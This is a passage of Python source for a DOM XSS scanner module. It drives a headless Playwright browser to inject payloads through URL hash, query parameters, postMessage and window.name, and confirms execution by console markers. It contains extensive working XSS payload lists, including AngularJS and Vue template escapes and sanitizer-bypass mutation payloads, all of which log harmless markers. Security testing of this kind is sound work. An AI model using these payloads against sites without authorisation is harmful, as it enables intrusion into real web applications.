"""
DOM XSS Scanner v1.0 - Real JavaScript Execution Edition

Enterprise-grade DOM-based XSS scanner using Playwright headless browser.
Unlike static analysis, this scanner ACTUALLY EXECUTES JavaScript to confirm
DOM XSS vulnerabilities with zero false positives.

Features:
- Real browser-based JavaScript execution
- Multiple injection vectors (hash, query params, postMessage)
- Source-to-sink tracking
- CSP bypass detection
- Screenshot evidence
- Confidence scoring based on actual execution

Author: PetNTester AI
Version: 1.0.0
"""

from __future__ import annotations

import asyncio
import hashlib
import time
from dataclasses import dataclass
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import parse_qs, urlencode, urlparse

from scanning.findings import Finding, Severity, VulnType
from scanning.vuln_scanner import ScanModule
from utils.logger import get_logger
from utils.scan_client import get_scan_client
from scanning.scan_context import ScanContext

# Try to import headless browser
try:
    from utils.headless_browser import (
        HeadlessBrowserEngine,
        BrowserConfig,
        BrowserType,
        SecurityLevel,
        XSSResult,
        create_browser,
        is_playwright_available,
    )
    HEADLESS_AVAILABLE = is_playwright_available()
except ImportError:
    HEADLESS_AVAILABLE = False

if TYPE_CHECKING:
    from core.config_manager import Settings
    from utils.rate_limiter import RateLimiter

logger = get_logger(__name__)


# =============================================================================
# VERSION & CONSTANTS
# =============================================================================

DOM_XSS_SCANNER_VERSION = "1.2.0"  # G-03 FIX: Parallel workers for stability

# Minimum confidence to report
MIN_CONFIDENCE_THRESHOLD = 80

# G-03 FIX: Parallel execution settings
MAX_PARALLEL_WORKERS = 3  # Max concurrent endpoint tests
ENDPOINT_TIMEOUT = 30.0   # Max time per endpoint
OVERALL_TIMEOUT = 180.0   # Max time for entire scan (3 min)


async def safe_navigate(browser: Any, url: str, wait_until: str = "domcontentloaded", timeout: float = 15.0) -> bool:
    """
    Safely navigate to a URL, handling Playwright errors gracefully.

    FIX 2026-02-16: Prevents "Future exception was never retrieved" errors
    when browser context is closed or frame is detached during navigation.

    Returns:
        True if navigation succeeded, False otherwise
    """
    try:
        await asyncio.wait_for(
            browser.navigate(url, wait_until=wait_until),
            timeout=timeout
        )
        return True
    except asyncio.TimeoutError:
        logger.debug(f"[DOM-XSS] Navigation timeout for {url[:50]}...")
        return False
    except Exception as e:
        error_msg = str(e).lower()
        # Handle Playwright-specific errors gracefully
        # FIX 2026-02-16: Added "aborted", "detached", "frame" for ERR_ABORTED errors
        recoverable_errors = [
            "target", "closed", "context", "browser",  # TargetClosedError
            "aborted", "detached", "frame",  # ERR_ABORTED / frame detached
            "net::", "err_",  # Network errors
            "timeout", "navigation",  # Navigation errors
        ]
        if any(x in error_msg for x in recoverable_errors):
            logger.debug(f"[DOM-XSS] Navigation error (recoverable): {url[:50]}...")
            return False
        # Re-raise other errors
        raise

# XSS detection markers
XSS_MARKERS = {
    "CONSOLE": "PETNTESTER_DOM_XSS_CONSOLE_",
    "ALERT": "PETNTESTER_DOM_XSS_ALERT_",
    "ERROR": "PETNTESTER_DOM_XSS_ERROR_",
}


class DOMXSSVector(Enum):
    """DOM XSS injection vectors."""
    URL_HASH = auto()           # location.hash
    URL_SEARCH = auto()         # location.search / URLSearchParams
    URL_PATHNAME = auto()       # location.pathname
    DOCUMENT_REFERRER = auto()  # document.referrer
    WINDOW_NAME = auto()        # window.name
    POSTMESSAGE = auto()        # postMessage
    LOCAL_STORAGE = auto()      # localStorage
    SESSION_STORAGE = auto()    # sessionStorage
    DOCUMENT_COOKIE = auto()
    SPA_ROUTE_PARAM = auto()    # SPA hash route parameter (/#/route?param=)
    # NEW VECTORS 2026-02-12
    FRAGMENT_DIRECTIVE = auto()  # ::~text= fragment
    WEBSOCKET_MESSAGE = auto()   # WebSocket message handler
    SERVICE_WORKER = auto()      # Service Worker message


# Common SPA route patterns mapped to likely XSS-susceptible parameter names.
# Used when testing Angular/React/Vue apps with hash-based routing.
SPA_ROUTE_PARAMS: dict[str, list[str]] = {
    "search": ["q", "query", "search", "term", "keyword"],
    "track-result": ["id", "orderId"],
    "track-order": ["id", "orderId", "tracking"],
    "profile": ["id", "user", "username"],
    "user": ["id", "name"],
    "product": ["id", "name"],
    "item": ["id", "name"],
    "error": ["message", "msg", "error", "url"],
    "redirect": ["url", "to", "next", "returnUrl"],
    "callback": ["url", "redirect_uri"],
    "complain": ["message", "complaint"],
    "contact": ["comment", "message"],
    # Fallback params tried on any route not matched above
    "__default__": ["q", "id", "search", "query", "name"],
}


class DOMXSSSink(Enum):
    """DOM XSS sink types."""
    INNERHTML = "innerHTML"
    OUTERHTML = "outerHTML"
    DOCUMENT_WRITE = "document.write"
    EVAL = "eval"
    FUNCTION = "Function"
    SETTIMEOUT = "setTimeout"
    SETINTERVAL = "setInterval"
    JQUERY_HTML = "$.html"
    LOCATION = "location"
    SRCDOC = "srcdoc"


@dataclass
class DOMXSSFinding:
    """DOM XSS finding with evidence."""
    vulnerable: bool
    vector: DOMXSSVector
    sink: Optional[DOMXSSSink]
    payload: str
    url: str
    evidence: list[str]
    console_messages: list[str]
    triggered_alerts: list[str]
    screenshot: Optional[bytes]
    confidence: float
    execution_time_ms: float


# =============================================================================
# DOM XSS PAYLOADS
# =============================================================================

class DOMXSSPayloads:
    """DOM XSS payload generator with unique markers."""

    @staticmethod
    def get_payloads_for_vector(vector: DOMXSSVector, marker_id: str) -> list[str]:
        """Get payloads optimized for specific vector."""
        marker_console = f"{XSS_MARKERS['CONSOLE']}{marker_id}"
        marker_alert = f"{XSS_MARKERS['ALERT']}{marker_id}"

        # Base payloads that work across vectors
        base_payloads = [
            # Console-based (works even with CSP in some cases)
            f'"><img src=x onerror="console.log(\'{marker_console}\')">',
            f"'-console.log('{marker_console}')-'",
            f'";console.log("{marker_console}");//',

            # Alert-based (classic)
            f'"><script>alert("{marker_alert}")</script>',
            f'<img src=x onerror=alert("{marker_alert}")>',
            f'<svg onload=alert("{marker_alert}")>',

            # Event handlers
            f'" onmouseover="console.log(\'{marker_console}\')" x="',
            f"' onfocus='console.log(\"{marker_console}\")' autofocus='",

            # Template literals (ES6)
            f'${{console.log("{marker_console}")}}',
        ]

        # Vector-specific payloads
        if vector == DOMXSSVector.URL_HASH:
            return base_payloads + [
                f'#<img src=x onerror=console.log("{marker_console}")>',
                f'#"><script>console.log("{marker_console}")</script>',
                f'#javascript:console.log("{marker_console}")',
            ]

        elif vector == DOMXSSVector.POSTMESSAGE:
            return [
                f'{{"type":"xss","payload":"<img src=x onerror=console.log(\'{marker_console}\')>"}}',
                f'<img src=x onerror=console.log("{marker_console}")>',
                f'{{"data":"<script>console.log(\'{marker_console}\')</script>"}}',
            ]

        elif vector == DOMXSSVector.WINDOW_NAME:
            return [
                f'<img src=x onerror=console.log("{marker_console}")>',
                f'<script>console.log("{marker_console}")</script>',
            ]

        return base_payloads

    @staticmethod
    def get_all_payloads(marker_id: str) -> list[str]:
        """Get comprehensive payload list."""
        marker_console = f"{XSS_MARKERS['CONSOLE']}{marker_id}"
        marker_alert = f"{XSS_MARKERS['ALERT']}{marker_id}"

        return [
            # Script tag injection
            f'<script>console.log("{marker_console}")</script>',
            f'</script><script>console.log("{marker_console}")</script>',
            f'</title><script>console.log("{marker_console}")</script>',
            f'</textarea><script>console.log("{marker_console}")</script>',

            # Event handlers
            f'<img src=x onerror=console.log("{marker_console}")>',
            f'<svg onload=console.log("{marker_console}")>',
            f'<body onload=console.log("{marker_console}")>',
            f'<input onfocus=console.log("{marker_console}") autofocus>',
            f'<marquee onstart=console.log("{marker_console}")>',
            f'<video><source onerror=console.log("{marker_console}")>',
            f'<audio src=x onerror=console.log("{marker_console}")>',
            f'<details open ontoggle=console.log("{marker_console}")>',

            # Attribute breakout
            f'"><img src=x onerror=console.log("{marker_console}")>',
            f"'><img src=x onerror=console.log('{marker_console}')>",
            f'" onmouseover=console.log("{marker_console}") x="',
            f"' onmouseover=console.log('{marker_console}') x='",

            # JavaScript context
            f'";console.log("{marker_console}");//',
            f"';console.log('{marker_console}');//",
            f'`-console.log("{marker_console}")-`',
            f'${{console.log("{marker_console}")}}',

            # Protocol handlers
            f'javascript:console.log("{marker_console}")',
            f'data:text/html,<script>console.log("{marker_console}")</script>',

            # SVG-based
            f'<svg><script>console.log("{marker_console}")</script></svg>',
            f'<svg><animate onbegin=console.log("{marker_console}")>',

            # Alert-based (for popup detection)
            f'<script>alert("{marker_alert}")</script>',
            f'<img src=x onerror=alert("{marker_alert}")>',

            # ====== FIX 2026-02-16: Classic DOM XSS payloads for Mutillidae-style apps ======
            # These work when app reads from document.URL, document.referrer, location.* and
            # writes to innerHTML without sanitization

            # iframe-based (classic Mutillidae DOM XSS)
            f'<iframe src="javascript:console.log(\'{marker_console}\')">',
            f'<iframe src=javascript:console.log("{marker_console}")>',
            f'<iframe onload=console.log("{marker_console}")>',
            f'<iframe srcdoc="<script>console.log(\'{marker_console}\')</script>">',

            # object/embed (classic vectors)
            f'<object data="javascript:console.log(\'{marker_console}\')">',
            f'<embed src="javascript:console.log(\'{marker_console}\')">',

            # Simple URL-based (no encoding, works on many apps)
            f'<script>console.log("{marker_console}")<\\/script>',
            f'%3Cscript%3Econsole.log(%22{marker_console}%22)%3C/script%3E',

            # Form action hijack
            f'<form action="javascript:console.log(\'{marker_console}\')"><input type=submit>',

            # Link with javascript:
            f'<a href="javascript:console.log(\'{marker_console}\')" id=xss>click</a>',

            # Base tag hijack (if document.write is used)
            f'<base href="javascript:console.log(\'{marker_console}\')//">',

            # Style-based (older browsers)
            f'<div style="background:url(javascript:console.log(\'{marker_console}\'))">',

            # Mutation XSS patterns (DOMPurify bypass)
            f'<math><mtext><table><mglyph><style><img src=x onerror=console.log("{marker_console}")>',
            f'<noscript><p title="</noscript><img src=x onerror=console.log(\'{marker_console}\')>">',
        ]

    @staticmethod
    def get_framework_payloads(marker_id: str) -> list[str]:
        """
        Get framework-specific DOM XSS payloads.

        NEW 2026-02-12: Targets Angular, Vue, React, Svelte, HTMX, Alpine.js
        These bypass framework-level sanitization.
        """
        marker_console = f"{XSS_MARKERS['CONSOLE']}{marker_id}"

        return [
            # ===== ANGULAR PAYLOADS =====
            # Angular expression injection (AngularJS 1.x)
            f'{{{{constructor.constructor("console.log(\'{marker_console}\')")()}}}}',
            f'{{{{$on.constructor("console.log(\'{marker_console}\')")()}}}}',
            f'{{{{"a]".constructor.prototype.charAt=[].join;$eval("x]console.log(\'{marker_console}\')//")}}}}',

            # Angular 2+ template injection (less common but possible)
            f'<div [innerHTML]="\'<img src=x onerror=console.log(\\\'{marker_console}\\\')>\'"></div>',

            # Angular bypassSecurityTrustHtml (if used incorrectly)
            f'<img src=x onerror="console.log(\'{marker_console}\')">',

            # FIX 2026-02-12: iframe-based XSS (works on Juice Shop and many Angular apps)
            # iframe with javascript: src (classic Juice Shop DOM XSS)
            f'<iframe src="javascript:console.log(\'{marker_console}\')">',
            f'<iframe src=javascript:console.log("{marker_console}")>',
            # iframe srcdoc (may bypass some sanitizers)
            f'<iframe srcdoc="<script>console.log(\'{marker_console}\')</script>">',
            # iframe onload
            f'<iframe onload="console.log(\'{marker_console}\')">',

            # ===== VUE.JS PAYLOADS =====
            # Vue 2 template injection
            f'{{{{_c.constructor("console.log(\'{marker_console}\')")()}}}}',
            f'{{{{_self.constructor.constructor("console.log(\'{marker_console}\')")()}}}}',

            # Vue 3 template injection
            f'{{{{$attrs.constructor.constructor("console.log(\'{marker_console}\')")()}}}}',

            # v-html directive (if user data flows to it)
            f'<div v-html="\'<img src=x onerror=console.log(\\\'{marker_console}\\\')>\'"></div>',

            # ===== REACT PAYLOADS =====
            # dangerouslySetInnerHTML (if user data flows to it)
            f'<div dangerouslySetInnerHTML={{{{__html: "<img src=x onerror=console.log(\'{marker_console}\')>"}}}}></div>',

            # React href/src with javascript: (blocked in newer React but worth testing)
            f'javascript:console.log("{marker_console}")',

            # ===== SVELTE PAYLOADS =====
            # {@html} directive
            f'{{@html "<img src=x onerror=console.log(\'{marker_console}\')>"}}',

            # ===== HTMX PAYLOADS =====
            # HTMX attribute injection
            f'<div hx-on::load="console.log(\'{marker_console}\')"></div>',
            f'<div hx-trigger="load" hx-on="htmx:load: console.log(\'{marker_console}\')"></div>',

            # ===== ALPINE.JS PAYLOADS =====
            # Alpine x-data injection
            f'<div x-data x-init="console.log(\'{marker_console}\')"></div>',
            f'<div x-data="{{}}" @click="console.log(\'{marker_console}\')"></div>',
            f'<div x-data x-on:click="console.log(\'{marker_console}\')">click</div>',

            # ===== JQUERY PAYLOADS =====
            # jQuery .html() / .append() / .prepend()
            f'<img src=x onerror=$.globalEval("console.log(\'{marker_console}\')")>',

            # ===== MUTATION XSS (mXSS) PAYLOADS =====
            # Browser normalization exploits (DOMPurify bypasses)
            f'<math><mtext><table><mglyph><style><img src=x onerror=console.log("{marker_console}")>',
            f'<svg><foreignObject><div><style><a id="</style><img src=x onerror=console.log(\'{marker_console}\')>"></a></div></foreignObject></svg>',
            f'<noscript><p title="</noscript><img src=x onerror=console.log(\'{marker_console}\')>">',

            # ===== PROTOTYPE POLLUTION XSS =====
            # If prototype pollution exists, these trigger XSS
            f'?__proto__[innerHTML]=<img src=x onerror=console.log("{marker_console}")>',
            f'?constructor[prototype][innerHTML]=<img src=x onerror=console.log("{marker_console}")>',
        ]


# =============================================================================
# DOM XSS SCANNER
# =============================================================================

class DOMXSSScanner(ScanModule):
    """
    DOM XSS Scanner with Real JavaScript Execution.

    This scanner uses a headless browser (Playwright) to actually execute
    JavaScript and confirm DOM XSS vulnerabilities. Unlike static analysis,
    this produces zero false positives because it verifies actual execution.

    Features:
    - Real browser-based testing
    - Multiple injection vectors
    - CSP bypass attempts
    - Screenshot evidence
    - Source-to-sink analysis
    """

    name = "dom_xss_scanner"
    version = DOM_XSS_SCANNER_VERSION

    def __init__(
        self,
        settings: "Settings",
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = getattr(settings.timeouts, 'request_timeout', 30)
        self._browser: Optional[HeadlessBrowserEngine] = None
        # G-03 FIX: Semaphore for parallel workers
        self._worker_semaphore: Optional[asyncio.Semaphore] = None
        self._scan_start_time: float = 0.0

    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: "RateLimiter",
    ) -> dict[str, Any]:
        """
        Execute DOM XSS scan with real JavaScript execution.

        Args:
            host: Target host
            asset_data: Asset data with endpoints, JS files, etc.
            rate_limiter: Rate limiter for request throttling

        Returns:
            Scan results with findings
        """

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        logger.info(f"[DOM-XSS v{self.version}] Starting scan on {host}")

        findings: list[dict] = []
        info_items: list[dict] = []
        stats = {
            "endpoints_tested": 0,
            "payloads_tested": 0,
            "vectors_tested": 0,
            "browser_used": False,
        }

        # Check if headless browser is available
        if not HEADLESS_AVAILABLE:
            logger.warning("[DOM-XSS] Playwright not available, falling back to static analysis")
            info_items.append({
                "type": "warning",
                "message": "Headless browser not available. Install with: pip install playwright && playwright install",
            })
            # Fall back to static analysis
            return await self._static_analysis_fallback(host, asset_data, rate_limiter)

        stats["browser_used"] = True

        # Get endpoints to test - FIXED: Initialize with defaults before conditional checks
        endpoints: list[str] = []
        js_files: list[str] = []
        crawled_pages: list[Any] = []

        if isinstance(asset_data, dict):
            endpoints = asset_data.get("endpoints", [])
            js_files = asset_data.get("js_files", [])
            crawled_pages = asset_data.get("crawled_pages", [])

        # Add default endpoint if none provided
        if not endpoints:
            if host.startswith("http://") or host.startswith("https://"):
                endpoints = [host.rstrip("/") + "/"]
            else:
                port = host.split(":")[-1] if ":" in host else "443"
                scheme = "http" if port in ("80", "8080", "8000", "3000", "5000", "8888") else "https"
                endpoints = [f"{scheme}://{host}/"]

        # Add crawled pages to endpoints
        for page in crawled_pages:
            if isinstance(page, dict) and "url" in page:
                endpoints.append(page["url"])
            elif isinstance(page, str):
                endpoints.append(page)

        # Deduplicate
        endpoints = list(set(endpoints))

        # Create browser config
        browser_config = BrowserConfig(
            browser_type=BrowserType.CHROMIUM,
            headless=True,
            security_level=SecurityLevel.RELAXED,
            timeout=self.timeout * 1000,
            capture_console=True,
            capture_network=True,
        )

        try:
            async with create_browser(browser_config) as browser:
                self._browser = browser
                self._scan_start_time = time.time()  # G-03 FIX: Track start time
                self._worker_semaphore = asyncio.Semaphore(MAX_PARALLEL_WORKERS)

                # FIX 2026-02-16: Verify browser is actually working
                try:
                    await browser.navigate("about:blank", wait_until="load")
                    logger.debug("[DOM-XSS] Browser health check: OK")
                except Exception as e:
                    logger.error(f"[DOM-XSS] Browser health check FAILED: {e}")
                    logger.warning("[DOM-XSS] Falling back to static analysis due to browser issues")
                    return await self._static_analysis_fallback(host, asset_data, rate_limiter)

                # G-03 FIX: Helper to check overall timeout
                def check_timeout() -> bool:
                    return (time.time() - self._scan_start_time) >= OVERALL_TIMEOUT

                # G-03 FIX: Parallel worker function with error isolation
                async def test_endpoint_worker(endpoint: str) -> list[dict]:
                    """Test single endpoint with timeout and error handling."""
                    if check_timeout():
                        return []

                    async with self._worker_semaphore:
                        await rate_limiter.acquire(host)

                        try:
                            async with asyncio.timeout(ENDPOINT_TIMEOUT):
                                endpoint_findings = await self._test_endpoint(
                                    browser, endpoint, rate_limiter, host
                                )
                                return [f.to_dict() for f in endpoint_findings]
                        except asyncio.TimeoutError:
                            logger.debug(f"[DOM-XSS] Endpoint timeout: {endpoint[:50]}...")
                            return []
                        except Exception as e:
                            logger.debug(f"[DOM-XSS] Error testing {endpoint}: {e}")
                            return []

                # G-03 FIX: Run endpoints in parallel batches
                endpoints_to_test = endpoints[:20]  # Limit for efficiency
                stats["endpoints_tested"] = len(endpoints_to_test)

                # Process in batches to avoid overwhelming the browser
                batch_size = MAX_PARALLEL_WORKERS * 2
                for i in range(0, len(endpoints_to_test), batch_size):
                    if check_timeout():
                        logger.info(f"[DOM-XSS] Overall timeout reached ({OVERALL_TIMEOUT}s)")
                        break

                    batch = endpoints_to_test[i:i + batch_size]
                    tasks = [test_endpoint_worker(ep) for ep in batch]

                    # Run batch with overall timeout protection
                    try:
                        async with asyncio.timeout(OVERALL_TIMEOUT - (time.time() - self._scan_start_time)):
                            batch_results = await asyncio.gather(*tasks, return_exceptions=True)

                            for result in batch_results:
                                if isinstance(result, list):
                                    findings.extend(result)
                                    stats["payloads_tested"] += len(result)
                    except asyncio.TimeoutError:
                        logger.info("[DOM-XSS] Batch timeout - moving to next phase")
                        break

                # --- SPA Route Testing ---
                # Discover and test SPA hash routes (Angular/React/Vue).
                # These use hash-based routing (/#/route?param=value) which the
                # regular endpoint/hash tests above don't cover.
                # G-03 FIX: Only run if we have time remaining
                if not check_timeout():
                    try:
                        spa_base = endpoints[0].rstrip("/") if endpoints else ""
                        if spa_base:
                            async with asyncio.timeout(30.0):  # G-03 FIX: 30s max for SPA discovery
                                spa_routes = await self._discover_spa_routes(browser, spa_base)
                                if spa_routes:
                                    logger.info(
                                        f"[DOM-XSS] Testing {len(spa_routes)} SPA routes"
                                    )
                                    spa_findings = await self._test_spa_routes(
                                        browser, spa_base, spa_routes, rate_limiter, host
                                    )
                                    for f in spa_findings:
                                        findings.append(f.to_dict())
                                        stats["payloads_tested"] += 1
                                    stats["spa_routes_tested"] = len(spa_routes)
                    except asyncio.TimeoutError:
                        logger.debug("[DOM-XSS] SPA route testing timeout")
                    except Exception as e:
                        logger.debug(f"[DOM-XSS] SPA route testing error: {e}")

                # Analyze JavaScript files for potential DOM XSS
                # G-03 FIX: Only analyze JS if time permits
                if not check_timeout():
                    for js_url in js_files[:10]:
                        if check_timeout():
                            break
                        await rate_limiter.acquire(host)
                        try:
                            async with asyncio.timeout(10.0):  # G-03 FIX: 10s max per JS file
                                js_analysis = await browser.analyze_javascript_security(js_url)
                                if js_analysis.get("dangerous_patterns"):
                                    info_items.append({
                                        "type": "js_analysis",
                                        "url": js_url,
                                        "patterns": js_analysis["dangerous_patterns"],
                                    })
                        except asyncio.TimeoutError:
                            logger.debug(f"[DOM-XSS] JS analysis timeout: {js_url}")
                        except Exception as e:
                            logger.debug(f"[DOM-XSS] Error analyzing JS {js_url}: {e}")

        except Exception as e:
            logger.error(f"[DOM-XSS] Browser error: {e}")
            info_items.append({
                "type": "error",
                "message": f"Browser error: {str(e)}",
            })

        logger.info(f"[DOM-XSS v{self.version}] Scan complete: {len(findings)} findings")

        return {
            "module": self.name,
            "version": self.version,
            "findings": findings,
            "info": info_items,
            "stats": stats,
        }

    async def _test_endpoint(
        self,
        browser: HeadlessBrowserEngine,
        url: str,
        rate_limiter: "RateLimiter",
        host: str,
    ) -> list[Finding]:
        """Test an endpoint for DOM XSS."""
        findings = []
        parsed = urlparse(url)

        # Generate unique marker for this test
        marker_id = hashlib.md5(f"{url}{time.time()}".encode()).hexdigest()[:8]

        # Test different vectors
        vectors_to_test = [
            DOMXSSVector.URL_HASH,
            DOMXSSVector.URL_SEARCH,
        ]

        # Add query params from URL as injection points
        query_params = list(parse_qs(parsed.query).keys()) if parsed.query else []

        for vector in vectors_to_test:
            await rate_limiter.acquire(host)

            payloads = DOMXSSPayloads.get_payloads_for_vector(vector, marker_id)

            # FIX 2026-02-16: Increased from 5 to 10 payloads per vector to catch more edge cases
            for payload in payloads[:10]:
                result = await self._test_payload(browser, url, vector, payload, marker_id)

                if result and result.vulnerable:
                    finding = self._create_finding(result, url, vector)
                    findings.append(finding)
                    # Found confirmed XSS, move to next vector
                    break

        # Test postMessage vector
        await rate_limiter.acquire(host)
        pm_findings = await self._test_postmessage(browser, url, marker_id)
        findings.extend(pm_findings)

        # NEW 2026-02-12: Test window.name vector (often overlooked)
        await rate_limiter.acquire(host)
        wn_findings = await self._test_window_name(browser, url, marker_id)
        findings.extend(wn_findings)

        # NEW 2026-02-12: Test framework-specific payloads
        await rate_limiter.acquire(host)
        fw_findings = await self._test_framework_payloads(browser, url, marker_id)
        findings.extend(fw_findings)

        # FIX 2026-02-16: Test common DOM XSS parameters even if not in URL
        # Mutillidae and similar apps use these params that flow to innerHTML
        common_dom_params = [
            "page", "url", "file", "document", "folder", "path", "data",
            "target", "link", "source", "src", "ref", "redirect", "return",
            "next", "goto", "callback", "content", "message", "html", "text",
            "search", "q", "query", "input", "param", "value", "name",
        ]

        # Merge discovered params with common params (no duplicates)
        all_params_to_test = list(set(query_params + common_dom_params))

        # Test query parameters
        for param in all_params_to_test[:15]:  # Increased limit
            await rate_limiter.acquire(host)

            payloads = DOMXSSPayloads.get_all_payloads(marker_id)

            # FIX 2026-02-16: Increased from 3 to 8 payloads per param
            for payload in payloads[:8]:
                # Build test URL with payload in param
                test_params = parse_qs(parsed.query)
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"

                result = await self._test_payload(
                    browser, test_url, DOMXSSVector.URL_SEARCH, payload, marker_id
                )

                if result and result.vulnerable:
                    finding = self._create_finding(result, test_url, DOMXSSVector.URL_SEARCH)
                    finding.evidence.append(f"Vulnerable parameter: {param}")
                    findings.append(finding)
                    break

        return findings

    async def _test_payload(
        self,
        browser: HeadlessBrowserEngine,
        url: str,
        vector: DOMXSSVector,
        payload: str,
        marker_id: str,
    ) -> Optional[DOMXSSFinding]:
        """Test a specific payload for DOM XSS."""
        start_time = time.time()

        # Build test URL based on vector
        test_url = self._build_test_url(url, vector, payload)

        try:
            # Navigate to test URL (FIX 2026-02-16: use safe navigation)
            if not await safe_navigate(browser, test_url, wait_until="domcontentloaded"):
                return None

            # Wait for potential XSS execution
            await asyncio.sleep(0.5)

            # Get console messages and dialogs
            console_messages = browser.get_console_messages()
            dialogs = browser.get_dialogs()

            # Check for XSS markers
            marker_found = False
            evidence = []

            for msg in console_messages:
                if XSS_MARKERS["CONSOLE"] + marker_id in msg:
                    marker_found = True
                    evidence.append(f"Console: {msg}")

            for dialog in dialogs:
                if XSS_MARKERS["ALERT"] + marker_id in dialog:
                    marker_found = True
                    evidence.append(f"Dialog: {dialog}")

            if marker_found:
                execution_time = (time.time() - start_time) * 1000

                # Take screenshot as evidence
                screenshot = None
                try:
                    screenshot = await browser.screenshot()
                except Exception:
                    pass

                return DOMXSSFinding(
                    vulnerable=True,
                    vector=vector,
                    sink=self._detect_sink(payload),
                    payload=payload,
                    url=test_url,
                    evidence=evidence,
                    console_messages=console_messages,
                    triggered_alerts=dialogs,
                    screenshot=screenshot,
                    confidence=95.0,  # High confidence because we confirmed execution
                    execution_time_ms=execution_time,
                )

        except Exception as e:
            logger.debug(f"[DOM-XSS] Payload test error: {e}")

        return None

    async def _test_postmessage(
        self,
        browser: "HeadlessBrowserEngine",
        url: str,
        marker_id: str,
    ) -> list[Finding]:
        """Test for DOM XSS via postMessage handler vulnerabilities."""
        findings = []

        try:
            # Navigate to the page first (FIX 2026-02-16: use safe navigation)
            if not await safe_navigate(browser, url, wait_until="domcontentloaded"):
                return findings
            await asyncio.sleep(0.5)

            # Check if page has message event listeners
            has_listener = await browser.evaluate("""
                () => {
                    // Check for addEventListener('message', ...)
                    const listeners = window._phantom_pm_listeners || [];
                    return listeners.length > 0 || document.querySelector('[onmessage]') !== null;
                }
            """)

            # Inject listener detector first (for future page loads)
            await browser.evaluate("""
                () => {
                    // Monkey-patch addEventListener to detect message handlers
                    const orig = window.addEventListener;
                    window._phantom_pm_listeners = [];
                    window.addEventListener = function(type, fn, opts) {
                        if (type === 'message') {
                            window._phantom_pm_listeners.push(fn.toString().substring(0, 200));
                        }
                        return orig.call(this, type, fn, opts);
                    };
                }
            """)

            # Reload to capture listeners registered on load (FIX 2026-02-16: use safe navigation)
            if not await safe_navigate(browser, url, wait_until="domcontentloaded"):
                return findings
            await asyncio.sleep(0.5)

            listener_info = await browser.evaluate("""
                () => window._phantom_pm_listeners || []
            """)

            if not listener_info and not has_listener:
                return findings  # No message handlers

            logger.info(f"[DOM-XSS] Found {len(listener_info) if listener_info else '?'} postMessage listener(s) at {url}")

            # Test XSS payloads via postMessage
            xss_payloads = [
                f'<img src=x onerror="console.log(\\\'PHANTOMXSS{marker_id}\\\')">',
                f'<script>console.log("PHANTOMXSS{marker_id}")</script>',
                f'{{"type":"xss","data":"<img src=x onerror=console.log(\\\'PHANTOMXSS{marker_id}\\\')>"}}',
                f'{{"action":"update","html":"<img src=x onerror=console.log(\\\'PHANTOMXSS{marker_id}\\\')>"}}',
                f'{{"__proto__":{{"innerHTML":"<img src=x onerror=console.log(\\\'PHANTOMXSS{marker_id}\\\')>"}}}}',
            ]

            for pm_payload in xss_payloads:
                # Clear console
                browser.clear_console()

                # Send postMessage with XSS payload
                await browser.evaluate(f"""
                    () => {{
                        window.postMessage({pm_payload!r}, '*');
                    }}
                """)

                await asyncio.sleep(0.3)

                # Check if our marker appeared in console
                console_msgs = browser.get_console_messages()
                marker_found = any(f"PHANTOMXSS{marker_id}" in msg for msg in console_msgs)

                if marker_found:
                    finding = self._create_finding(
                        DOMXSSFinding(
                            vulnerable=True,
                            vector=DOMXSSVector.POSTMESSAGE,
                            sink="postMessage handler",
                            payload=pm_payload,
                            url=url,
                            evidence=[
                                "postMessage handler executes untrusted data",
                                f"Payload delivered via window.postMessage()",
                                f"Console marker confirmed: PHANTOMXSS{marker_id}",
                            ],
                            console_messages=console_msgs,
                            triggered_alerts=[],
                            screenshot=None,
                            confidence=90.0,
                            execution_time_ms=0,
                        ),
                        url,
                        DOMXSSVector.POSTMESSAGE,
                    )
                    findings.append(finding)
                    logger.info(f"[DOM-XSS] postMessage XSS confirmed at {url}")
                    break  # One confirmation is enough

        except Exception as e:
            logger.debug(f"[DOM-XSS] postMessage test error: {e}")

        return findings

    async def _test_window_name(
        self,
        browser: "HeadlessBrowserEngine",
        url: str,
        marker_id: str,
    ) -> list[Finding]:
        """
        Test for DOM XSS via window.name injection.

        NEW 2026-02-12: window.name persists across navigations and is often
        used by SPAs for cross-origin communication. It's a classic DOM XSS
        vector that many scanners miss.
        """
        findings: list[Finding] = []
        marker = f"PHANTOMXSS_WN_{marker_id}"

        try:
            # First, set window.name with XSS payload via a data: URL
            payloads = [
                f'<img src=x onerror="console.log(\'{marker}\')">',
                f'<script>console.log("{marker}")</script>',
                f'"onmouseover="console.log(\'{marker}\')"',
            ]

            for payload in payloads:
                # Open a data: URL that sets window.name, then navigates to target
                # This simulates an attacker page that sets window.name before redirect
                setup_script = f"""
                    () => {{
                        window.name = {payload!r};
                        return window.name;
                    }}
                """

                # FIX 2026-02-16: Use safe navigation
                if not await safe_navigate(browser, url, wait_until="domcontentloaded"):
                    continue  # Skip this payload
                await browser.evaluate(setup_script)

                # Wait and check for XSS execution
                await asyncio.sleep(0.5)

                # Some apps read window.name on page load
                # Trigger common scenarios that read window.name
                await browser.evaluate("""
                    () => {
                        // Some apps use window.name for data passing
                        if (window.name && typeof window.handleName === 'function') {
                            window.handleName(window.name);
                        }
                        // jQuery plugins sometimes use window.name
                        if (typeof $ !== 'undefined' && $.fn.parseWindowName) {
                            $.fn.parseWindowName();
                        }
                        // Trigger any onload handlers that might read window.name
                        window.dispatchEvent(new Event('load'));
                    }
                """)

                await asyncio.sleep(0.3)

                console_msgs = browser.get_console_messages()
                if any(marker in msg for msg in console_msgs):
                    finding = self._create_finding(
                        DOMXSSFinding(
                            vulnerable=True,
                            vector=DOMXSSVector.WINDOW_NAME,
                            sink="window.name handler",
                            payload=payload,
                            url=url,
                            evidence=[
                                "window.name contents executed as HTML/JS",
                                f"Payload injected via window.name",
                                f"Console marker confirmed: {marker}",
                            ],
                            console_messages=console_msgs,
                            triggered_alerts=[],
                            screenshot=None,
                            confidence=90.0,
                            execution_time_ms=0,
                        ),
